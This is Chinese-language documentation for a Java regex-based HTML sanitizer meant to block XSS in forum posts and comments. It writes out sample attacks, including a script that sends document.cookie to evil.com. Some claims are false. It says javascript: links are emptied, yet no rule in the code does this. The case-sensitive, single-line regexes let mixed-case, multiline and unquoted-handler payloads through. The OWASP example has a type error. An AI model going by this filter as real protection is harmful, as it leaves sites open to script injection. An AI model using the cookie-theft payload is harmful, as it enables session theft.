# HTML 净化工具类 - HtmlSanitizerUtil

## 类简介

`HtmlSanitizerUtil` 是用于净化 HTML 内容的安全工具类，通过正则表达式移除潜在的 XSS（跨站脚本攻击）恶意代码，防止用户输入的 HTML 被执行。

## 核心功能

1. **移除脚本标签** - 删除 `<script>` 标签及其内容
2. **移除样式标签** - 删除 `<style>` 标签及其内容
3. **移除 iframe** - 删除 `<iframe>` 标签及其内容
4. **移除事件属性** - 删除 HTML 事件属性（如 onclick、onerror 等）

## 核心方法

```java
/**
 * 净化HTML内容，移除潜在恶意代码
 * @param html 原始HTML字符串
 * @return 净化后的HTML字符串
 */
public static String sanitize(String html) {
    if (html == null) {
        return null;
    }
    return html
            .replaceAll("<script[^>]*>.*?</script>", "")    // 移除script标签
            .replaceAll("<style[^>]*>.*?</style>", "")      // 移除style标签
            .replaceAll("<iframe[^>]*>.*?</iframe>", "")    // 移除iframe标签
            .replaceAll("on\\w+=\"[^\"]*\"", "")            // 移除on事件属性(双引号)
            .replaceAll("on\\w+='[^']*'", "");             // 移除on事件属性(单引号)
}
```

## 过滤规则详解

### 1. 移除 Script 标签
```java
.replaceAll("<script[^>]*>.*?</script>", "")
```
- **匹配模式**: `<script[^>]*>.*?</script>`
- **作用**: 移除所有 `<script>` 标签及其包含的 JavaScript 代码
- **示例**:
  - 输入: `<script>alert('xss')</script>Hello`
  - 输出: `Hello`

### 2. 移除 Style 标签
```java
.replaceAll("<style[^>]*>.*?</style>", "")
```
- **匹配模式**: `<style[^>]*>.*?</style>`
- **作用**: 移除所有 `<style>` 标签及其包含的 CSS 样式
- **示例**:
  - 输入: `<style>body{background:red}</style>World`
  - 输出: `World`

### 3. 移除 Iframe 标签
```java
.replaceAll("<iframe[^>]*>.*?</iframe>", "")
```
- **匹配模式**: `<iframe[^>]*>.*?</iframe>`
- **作用**: 移除所有 `<iframe>` 标签，防止嵌入恶意网站
- **示例**:
  - 输入: `<iframe src="evil.com"></iframe>Content`
  - 输出: `Content`

### 4. 移除事件属性（双引号）
```java
.replaceAll("on\\w+=\"[^\"]*\"", "")
```
- **匹配模式**: `on\w+="[^"]*"`
- **作用**: 移除形如 `onclick="..."`、`onerror="..."` 的事件属性
- **示例**:
  - 输入: `<img src="x" onerror="alert(1)">`
  - 输出: `<img src="x" >`

### 5. 移除事件属性（单引号）
```java
.replaceAll("on\\w+='[^']*'", "")
```
- **匹配模式**: `on\w+='[^']*'`
- **作用**: 移除形如 `onclick='...'` 的事件属性（单引号版本）
- **示例**:
  - 输入: `<button onclick='alert(1)'>Click</button>`
  - 输出: `<button >Click</button>`

## 常见 XSS 攻击示例

### 1. Script 标签攻击
```html
<!-- 恶意输入 -->
<script>document.location='http://evil.com?cookie='+document.cookie</script>

<!-- 净化后 -->
<!-- 已被移除 -->
```

### 2. 事件属性攻击
```html
<!-- 恶意输入 -->
<img src="x" onerror="alert('XSS')">
<a href="javascript:alert('XSS')">click</a>
<body onload="alert('XSS')">

<!-- 净化后 -->
<img src="x" >
<a href="">click</a>
<body >
```

### 3. Iframe 嵌入攻击
```html
<!-- 恶意输入 -->
<iframe src="http://evil.com/phishing"></iframe>

<!-- 净化后 -->
<!-- 已被移除 -->
```

## 使用场景

### 1. 在 Controller 中使用
```java
/**
 * 发布帖子
 */
@PostMapping("/publish")
public Result<Void> publish(@RequestBody PostPublishDTO dto) {
    // 净化标题和内容
    if (dto.getTitle() != null) {
        dto.setTitle(HtmlSanitizerUtil.sanitize(dto.getTitle()));
    }
    if (dto.getContent() != null) {
        dto.setContent(HtmlSanitizerUtil.sanitize(dto.getContent()));
    }

    // 继续业务逻辑
    postService.publish(dto, userId);
    return Result.success();
}
```

### 2. 在 Service 中使用
```java
/**
 * 评论服务
 */
@Override
public void publishComment(Comment comment) {
    // 净化评论内容
    String sanitizedContent = HtmlSanitizerUtil.sanitize(comment.getContent());
    comment.setContent(sanitizedContent);

    // 保存评论
    commentMapper.insert(comment);
}
```

## 注意事项

1. **局限性** - 该工具使用正则表达式，对于复杂攻击可能不够完善
2. **建议配合** - 建议同时使用专业的 HTML 净化库（如 Jsoup、OWASP Java HTML Sanitizer）
3. **双重防护** - 结合敏感词过滤和 XSS 防护双重保护

## 进阶方案（可选）

如果需要更强大的 HTML 净化功能，可以使用 OWASP Java HTML Sanitizer：

```java
// 引入依赖
// <dependency>
//     <groupId>com.googlecode.owasp-java-html-sanitizer</groupId>
//     <artifactId>owasp-java-html-sanitizer</artifactId>
//     <version>20220608.1</version>
// </dependency>

// 配置净化策略
private static final HtmlPolicyBuilder POLICY_BUILDER = new HtmlPolicyBuilder()
        .allowElements("p", "br", "b", "i", "em", "strong", "a", "img")
        .allowUrlProtocols("http", "https")
        .allowAttributes("href", "src", "alt")
        .onElements("a", "img");

private static final HtmlSanitizer POLICY = POLICY_BUILDER.toFactory();

public static String sanitizeAdvanced(String html) {
    return POLICY.sanitize(html);
}
```

## 相关文件

| 文件路径 | 说明 |
|----------|------|
| `jsyl-common/src/main/java/com/jsyl/utils/HtmlSanitizerUtil.java` | HTML净化工具类 |
| `jsyl-server/src/main/java/com/jsyl/service/impl/PostServiceImpl.java` | 帖子服务（使用净化） |
| `jsyl-server/src/main/java/com/jsyl/service/impl/CommentServiceImpl.java` | 评论服务（使用净化） |
